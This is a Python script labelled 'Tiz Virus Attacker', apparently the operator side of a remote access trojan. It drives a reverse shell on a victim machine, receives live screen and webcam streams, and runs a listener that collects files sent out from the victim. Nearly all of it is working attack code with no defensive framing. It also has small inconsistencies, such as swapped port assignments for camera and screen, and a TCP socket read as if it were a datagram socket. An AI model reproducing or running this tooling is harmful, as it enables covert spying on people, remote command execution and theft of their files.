# -*- coding: utf-8 -*-
"""
Created on Dec 23 2020

@autor Tiz
"""

from __future__ import division
import numpy as np
import socket, argparse, sys, threading, os


# arguments parser
def parseargs():
    cli_args = argparse.ArgumentParser(description="Tiz Virus Attacker")
    cli_args.add_argument('--host', help="connecting ip, default is localhost'", default='127.0.0.1', type=str)
    cli_args.add_argument('--port',
                          help="default port is 5000, revershell = port, camera stream = port+1, screen stream = port+2",
                          default=5000, type=int)
    cli_args.add_argument('--shell', help="shell=t revershell on port (default = 5000) / shell=f don't revershell",
                          default="t", type=str)
    cli_args.add_argument('--camera', help="camera=t stream camera on port+1 (default = 5001) / camera=f don't stream",
                          default="t", type=str)
    cli_args.add_argument('--screen', help="screen=t stream screen on port+2 (default = 5002) / screen=f don't stream",
                          default="t", type=str)
    options = cli_args.parse_args(sys.argv[1:])
    return options


# reverse shell receiver
def R_tcp(host='192.168.1.23', port=5000):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    BUFFER_SIZE = 1024
    s.connect((host, port))
    message = s.recv(BUFFER_SIZE).decode()
    while True:
        command = input("Enter the command you wanna execute:")
        s.send(command.encode())
        if command.lower() == "exit":
            break
        results = s.recv(BUFFER_SIZE).decode()
        print(results)
    s.close()


# Screen receiver
def recvall(conn, length):
    buf = b''
    while len(buf) < length:
        data = conn.recv(length - len(buf))
        if not data:
            return data
        buf += data
    return buf


def screenreceiver(host='192.168.1.23', port=5001):
    pygame.init()
    screen = pygame.display.set_mode((WIDTH, HEIGHT))
    clock = pygame.time.Clock()
    with socket.socket() as sock:
        sock.connect((host, port))
        watching = True
        while watching:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    watching = False
                    break
            # Récupération de la taille de la taille des pixels, la taille des pixels et les pixels
            size_len = int.from_bytes(sock.recv(1), byteorder='big')
            size = int.from_bytes(sock.recv(size_len), byteorder='big')
            pixels = recvall(sock, size)
            pixels = zlib.decompress(pixels)
            # Création d'une Surface depuis les pixels brutes
            img = pygame.image.fromstring(pixels, (WIDTH, HEIGHT), 'RGB')
            # Affichage de l'image
            screen.blit(img, (0, 0))
            pygame.display.flip()
            clock.tick(60)


# camera receiver
def dump_buffer(s):
    """ Emptying buffer frame """
    while True:
        seg, addr = s.recvfrom(MAX_DGRAM)
        if struct.unpack("B", seg[0:1])[0] == 1:
            break


def camreceiver(host='192.168.1.23', port=5002):
    import cv2
    import numpy as np
    import struct

    s = socket.socket()
    s.connect((host, port))
    dat = b''
    while True:
        seg, addr = s.recvfrom(MAX_DGRAM)
        if struct.unpack("B", seg[0:1])[0] > 1:
            dat += seg[1:]
        else:
            dat += seg[1:]
            print(f"Received data size: {len(dat)} bytes")  # In kích thước dữ liệu nhận được
            try:
                img = cv2.imdecode(np.frombuffer(dat, dtype=np.uint8), cv2.IMREAD_COLOR)
                if img is not None and img.size > 0:
                    cv2.imshow('frame', img)
                    if cv2.waitKey(1) & 0xFF == ord('q'):
                        break
                else:
                    print("Failed to decode image: Image is None or empty")
            except Exception as e:
                print(f"Error decoding image: {e}")
            dat = b''
    cv2.destroyAllWindows()
    s.close()

# File receiver
def receive_file(host, port, save_directory='received_files'):
    # Create the directory if it doesn't exist
    if not os.path.exists(save_directory):
        os.makedirs(save_directory)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen()
        print(f"Listening for files on {host}:{port}")
        conn, addr = s.accept()
        with conn:
            print(f"Connected by {addr}")
            while True:
                try:
                    # Receive and decode the file metadata (name and size)
                    file_info = conn.recv(1024).strip().decode('utf-8')
                    if not file_info:
                        print("No more file info received.")
                        break

                    # Split the received info into file name and file size
                    filename, filesize = file_info.split('|')
                    filesize = int(filesize)
                    print(f"Receiving {filename} with size {filesize} bytes")

                    # Save the file in the specified directory
                    filepath = os.path.join(save_directory, filename)
                    with open(filepath, 'wb') as f:
                        remaining = filesize
                        while remaining > 0:
                            chunk_size = 4096 if remaining >= 4096 else remaining
                            chunk = conn.recv(chunk_size)
                            if not chunk:
                                break
                            f.write(chunk)
                            remaining -= len(chunk)
                        print(f"Received {filename} successfully! Saved to {filepath}")
                except Exception as e:
                    print(f"Error receiving file: {e}")
                    break



if __name__ == '__main__':

    # parse args
    options = parseargs()
    # revershell receiver
    if (options.shell == "t"):
        threadshell = threading.Thread(target=R_tcp, args=(options.host, options.port,))  # port 5000
        threadshell.start()

    # screen receiver
    import pygame, zlib

    if (options.screen == "t"):
        WIDTH = 1900
        HEIGHT = 1000
        threadscreen = threading.Thread(target=screenreceiver, args=(options.host, options.port + 1,))  # port 5001
        threadscreen.start()

    # camreceiver
    import cv2, struct

    if (options.camera == "t"):
        MAX_DGRAM = 2 ** 16
        threadcam = threading.Thread(target=camreceiver, args=(options.host, options.port + 2,))  # port 5002
        threadcam.start()

    # File receiver
    file_transfer_port = options.port + 3
    threadfile = threading.Thread(target=receive_file, args=(options.host, file_transfer_port))
    threadfile.start()